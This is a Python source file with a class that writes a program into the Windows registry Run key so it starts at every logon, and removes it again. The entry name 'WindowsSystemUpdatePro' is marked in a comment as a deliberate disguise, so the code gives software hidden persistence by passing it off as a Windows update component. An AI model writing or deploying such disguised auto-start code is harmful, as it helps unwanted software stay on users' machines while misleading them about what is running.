import winreg
import os
import sys
import logging

logger = logging.getLogger(__name__)

class RegistryManager:
    APP_NAME = "WindowsSystemUpdatePro" # Disguise the app name
    REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

    @staticmethod
    def install_autostart(executable_path: str = None):
        """Adds the application to the Windows Registry for auto-start."""
        if os.name != 'nt':
            return
            
        if executable_path is None:
            executable_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
            
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RegistryManager.REG_PATH, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, RegistryManager.APP_NAME, 0, winreg.REG_SZ, f'"{executable_path}"')
            winreg.CloseKey(key)
            logger.info("Successfully added to Registry Auto-start.")
        except PermissionError:
            logger.error("Permission denied. Run as Administrator to modify Registry.")
        except Exception as e:
            logger.error(f"Failed to add registry key: {e}")

    @staticmethod
    def remove_autostart():
        """Removes the application from the Windows Registry auto-start."""
        if os.name != 'nt':
            return
            
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RegistryManager.REG_PATH, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, RegistryManager.APP_NAME)
            winreg.CloseKey(key)
            logger.info("Successfully removed from Registry Auto-start.")
        except FileNotFoundError:
            pass # Already removed
        except Exception as e:
            logger.error(f"Failed to remove registry key: {e}")
